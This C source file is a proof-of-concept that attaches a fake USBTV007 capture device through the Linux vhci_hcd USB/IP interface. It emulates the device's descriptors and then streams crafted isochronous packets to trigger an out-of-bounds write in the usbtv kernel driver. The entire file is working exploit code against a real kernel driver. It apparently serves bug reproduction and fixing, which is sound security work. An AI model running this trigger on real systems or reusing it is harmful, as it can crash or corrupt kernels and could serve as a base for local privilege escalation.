// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/sysmacros.h>
#include <arpa/inet.h>
#include <linux/videodev2.h>

#define USBIP_CMD_SUBMIT 1
#define USBIP_CMD_UNLINK 2
#define USBIP_RET_SUBMIT 3
#define USBIP_RET_UNLINK 4
#define USBIP_DIR_OUT 0
#define USBIP_DIR_IN  1

#define ISO_SIZE    1000
#define NPKT        8
#define CHUNK_STEP  256
#define TOTAL       (ISO_SIZE * NPKT)

struct usbip_hdr {
	uint32_t command;
	uint32_t seqnum;
	uint32_t devid;
	uint32_t direction;
	uint32_t ep;
	union {
		struct {
			uint32_t transfer_flags;
			int32_t  transfer_buffer_length;
			int32_t  start_frame;
			int32_t  number_of_packets;
			int32_t  interval;
			unsigned char setup[8];
		} cmd_submit;
		struct {
			int32_t status;
			int32_t actual_length;
			int32_t start_frame;
			int32_t number_of_packets;
			int32_t error_count;
		} ret_submit;
		struct { uint32_t seqnum; } cmd_unlink;
		struct { int32_t status; } ret_unlink;
	} u;
} __attribute__((packed));

struct usbip_iso {
	uint32_t offset;
	uint32_t length;
	uint32_t actual_length;
	uint32_t status;
} __attribute__((packed));

static int sk;
static int krn;
static volatile int iso_seen;

static const unsigned char dev_desc[18] = {
	18, 0x01,
	0x00, 0x02,
	0x00, 0x00, 0x00,
	64,
	0x71, 0x1b,
	0x02, 0x30,
	0x00, 0x01,
	0x00, 0x00, 0x00,
	0x01
};

#define CFG_LEN (9 + 9 + 9 + 4 * 7)
static const unsigned char cfg_desc[CFG_LEN] = {

	9, 0x02, CFG_LEN & 0xff, CFG_LEN >> 8, 1, 1, 0, 0x80, 50,

	9, 0x04, 0, 0, 0, 0xff, 0xff, 0xff, 0,

	9, 0x04, 0, 1, 4, 0xff, 0xff, 0xff, 0,

	7, 0x05, 0x81, 0x01, ISO_SIZE & 0xff, ISO_SIZE >> 8, 1,

	7, 0x05, 0x82, 0x01, 0x40, 0x00, 1,
	7, 0x05, 0x83, 0x01, 0x40, 0x00, 1,
	7, 0x05, 0x84, 0x01, 0x40, 0x00, 1,
};

static int read_all(int fd, void *buf, size_t len)
{
	size_t done = 0;
	while (done < len) {
		ssize_t r = read(fd, (char *)buf + done, len - done);
		if (r <= 0)
			return -1;
		done += r;
	}
	return 0;
}

static int write_all(int fd, const void *buf, size_t len)
{
	size_t done = 0;
	while (done < len) {
		ssize_t r = write(fd, (const char *)buf + done, len - done);
		if (r <= 0)
			return -1;
		done += r;
	}
	return 0;
}

static int reply(uint32_t seqnum_net, int status, const void *data, int len,
		 int nop, const struct usbip_iso *isos)
{
	struct usbip_hdr h;

	memset(&h, 0, sizeof(h));
	h.command = htonl(USBIP_RET_SUBMIT);
	h.seqnum = seqnum_net;
	h.u.ret_submit.status = htonl((uint32_t)status);
	h.u.ret_submit.actual_length = htonl((uint32_t)len);
	h.u.ret_submit.number_of_packets = htonl((uint32_t)nop);

	if (write_all(sk, &h, sizeof(h)) < 0)
		return -1;
	if (len > 0 && write_all(sk, data, len) < 0)
		return -1;
	if (nop > 0 && write_all(sk, isos, nop * sizeof(*isos)) < 0)
		return -1;
	return 0;
}

static void build_iso_payload(unsigned char *buf)
{
	unsigned char *pkt;

	memset(buf, 0, TOTAL);

	pkt = buf + (NPKT - 1) * ISO_SIZE;

	pkt[0] = 0x88; pkt[1] = 0x00; pkt[2] = 0x00; pkt[3] = 0x00;

	pkt[768] = 0x88; pkt[769] = 0x00; pkt[770] = 0x00; pkt[771] = 0x01;
}

static void *server(void *arg)
{
	static unsigned char iso_payload[TOTAL];
	static unsigned char scratch[65536];
	struct usbip_iso isos[NPKT];
	struct usbip_hdr h;
	int i;

	build_iso_payload(iso_payload);
	for (i = 0; i < NPKT; i++) {
		isos[i].offset = htonl(i * ISO_SIZE);
		isos[i].length = htonl(ISO_SIZE);
		isos[i].actual_length = htonl(ISO_SIZE);
		isos[i].status = htonl(0);
	}

	for (;;) {
		uint32_t cmd, dir, ep;
		int32_t len, nop;
		unsigned char setup[8];

		if (read_all(sk, &h, sizeof(h)) < 0) {
			printf("[server] socket closed\n");
			return NULL;
		}
		cmd = ntohl(h.command);
		dir = ntohl(h.direction);
		ep = ntohl(h.ep);

		if (cmd == USBIP_CMD_UNLINK) {
			struct usbip_hdr r;
			memset(&r, 0, sizeof(r));
			r.command = htonl(USBIP_RET_UNLINK);
			r.seqnum = h.seqnum;
			r.u.ret_unlink.status = htonl((uint32_t)-104);
			if (write_all(sk, &r, sizeof(r)) < 0)
				return NULL;
			continue;
		}
		if (cmd != USBIP_CMD_SUBMIT) {
			printf("[server] unknown command %u\n", cmd);
			return NULL;
		}

		len = (int32_t)ntohl(h.u.cmd_submit.transfer_buffer_length);
		nop = (int32_t)ntohl(h.u.cmd_submit.number_of_packets);
		memcpy(setup, h.u.cmd_submit.setup, 8);

		if (dir == USBIP_DIR_OUT && len > 0) {
			if (len > (int32_t)sizeof(scratch))
				return NULL;
			if (read_all(sk, scratch, len) < 0)
				return NULL;
		}
		if (nop > 0) {
			if (read_all(sk, scratch, (size_t)nop * 16) < 0)
				return NULL;
		}

		if (ep == 0) {

			unsigned bmreq = setup[0], breq = setup[1];
			if (getenv("USBTV_DEBUG"))
				printf("[ctrl] %02x %02x %02x%02x %02x%02x %02x%02x\n",
				       setup[0], setup[1], setup[3], setup[2],
				       setup[5], setup[4], setup[7], setup[6]);
			unsigned wval = setup[2] | (setup[3] << 8);
			unsigned wlen = setup[6] | (setup[7] << 8);

			if (bmreq == 0x80 && breq == 0x06) {
				unsigned type = wval >> 8;
				if (type == 0x01) {
					int n = wlen < sizeof(dev_desc) ? wlen : (int)sizeof(dev_desc);
					reply(h.seqnum, 0, dev_desc, n, 0, NULL);
				} else if (type == 0x02) {
					int n = wlen < CFG_LEN ? (int)wlen : CFG_LEN;
					reply(h.seqnum, 0, cfg_desc, n, 0, NULL);
				} else if (type == 0x03 && (wval & 0xff) == 0) {
					unsigned char lang[4] = { 4, 3, 0x09, 0x04 };
					int n = wlen < 4 ? wlen : 4;
					reply(h.seqnum, 0, lang, n, 0, NULL);
				} else {
					reply(h.seqnum, -32, NULL, 0, 0, NULL);
				}
			} else if (bmreq == 0x80 && breq == 0x00) {
				unsigned char st[2] = { 1, 0 };
				reply(h.seqnum, 0, st, wlen < 2 ? wlen : 2, 0, NULL);
			} else if (dir == USBIP_DIR_IN) {

				unsigned n = wlen > sizeof(scratch) ? sizeof(scratch) : wlen;
				memset(scratch, 0, n);
				reply(h.seqnum, 0, scratch, n, 0, NULL);
			} else {

				reply(h.seqnum, 0, NULL, 0, 0, NULL);
			}
			continue;
		}

		if (ep == 1 && dir == USBIP_DIR_IN && nop == NPKT) {

			if (!iso_seen) {
				iso_seen = 1;
				printf("[server] first ISO URB -> feeding crafted chunks\n");
				fflush(stdout);
			}
			reply(h.seqnum, 0, iso_payload, TOTAL, NPKT, isos);
			continue;
		}

		reply(h.seqnum, 0, NULL, 0, nop > 0 ? nop : 0,
		      nop > 0 ? isos : NULL);
	}
	return NULL;
}

static int attach(void)
{
	char buf[64];
	int fd, n;

	fd = open("/sys/devices/platform/vhci_hcd.0/attach", O_WRONLY);
	if (fd < 0) {
		perror("open vhci attach");
		return -1;
	}

	n = snprintf(buf, sizeof(buf), "%u %u %u %u", 0, krn, 1, 2);
	if (write(fd, buf, n) != n) {
		perror("write attach");
		close(fd);
		return -1;
	}
	close(fd);
	printf("[+] attached fake USBTV007 to vhci port 0\n");
	return 0;
}

static int open_usbtv_node(void)
{
	struct v4l2_capability cap;
	char path[64], name[64];
	int n, fd, r;

	for (n = 0; n < 256; n++) {
		snprintf(path, sizeof(path),
			 "/sys/class/video4linux/video%d/name", n);
		fd = open(path, O_RDONLY);
		if (fd < 0)
			continue;
		r = read(fd, name, sizeof(name) - 1);
		close(fd);
		if (r <= 0)
			continue;
		name[r] = 0;
		if (!strstr(name, "usbtv"))
			continue;

		snprintf(path, sizeof(path), "/dev/video%d", n);
		if (access(path, F_OK) != 0)
			mknod(path, S_IFCHR | 0600, makedev(81, n));
		fd = open(path, O_RDWR);
		if (fd < 0)
			continue;
		memset(&cap, 0, sizeof(cap));
		if (ioctl(fd, VIDIOC_QUERYCAP, &cap) == 0 &&
		    !strcmp((char *)cap.driver, "usbtv")) {
			printf("[+] usbtv node is %s (%s)\n", path, cap.card);
			return fd;
		}
		close(fd);
	}
	return -1;
}

static int wait_video(void)
{
	int i, fd;

	for (i = 0; i < 400; i++) {
		fd = open_usbtv_node();
		if (fd >= 0)
			return fd;
		usleep(50000);
	}
	return -1;
}

int main(void)
{
	int sv[2], vfd, i;
	pthread_t th;
	struct v4l2_capability cap;
	struct v4l2_requestbuffers req;
	enum v4l2_buf_type type = V4L2_BUF_TYPE_VIDEO_CAPTURE;

	setvbuf(stdout, NULL, _IONBF, 0);
	printf("[*] usbtv iso chunk OOB PoC\n");

	if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
		perror("socketpair");
		return 1;
	}
	krn = sv[0];
	sk = sv[1];

	if (pthread_create(&th, NULL, server, NULL)) {
		perror("pthread_create");
		return 1;
	}

	if (attach() < 0)
		return 1;

	vfd = wait_video();
	if (vfd < 0) {
		printf("[-] usbtv video node never appeared\n");
		return 1;
	}

	memset(&cap, 0, sizeof(cap));
	if (ioctl(vfd, VIDIOC_QUERYCAP, &cap) == 0)
		printf("[+] driver=%s card=%s\n", cap.driver, cap.card);

	memset(&req, 0, sizeof(req));
	req.count = 4;
	req.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
	req.memory = V4L2_MEMORY_MMAP;
	if (ioctl(vfd, VIDIOC_REQBUFS, &req) < 0) {
		perror("VIDIOC_REQBUFS");
		return 1;
	}
	printf("[+] reqbufs count=%u\n", req.count);

	for (i = 0; i < (int)req.count; i++) {
		struct v4l2_buffer b;
		memset(&b, 0, sizeof(b));
		b.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
		b.memory = V4L2_MEMORY_MMAP;
		b.index = i;
		if (ioctl(vfd, VIDIOC_QUERYBUF, &b) < 0) {
			perror("VIDIOC_QUERYBUF");
			return 1;
		}
		if (mmap(NULL, b.length, PROT_READ | PROT_WRITE, MAP_SHARED,
			 vfd, b.m.offset) == MAP_FAILED)
			perror("mmap");
		if (ioctl(vfd, VIDIOC_QBUF, &b) < 0) {
			perror("VIDIOC_QBUF");
			return 1;
		}
	}
	printf("[+] buffers queued, starting stream\n");

	if (ioctl(vfd, VIDIOC_STREAMON, &type) < 0) {
		perror("VIDIOC_STREAMON");
		return 1;
	}
	printf("[+] streaming\n");

	for (i = 0; i < 40; i++) {
		usleep(200000);
		if (iso_seen && i > 10)
			break;
	}
	printf("[*] done (iso_seen=%d)\n", iso_seen);
	return 0;
}
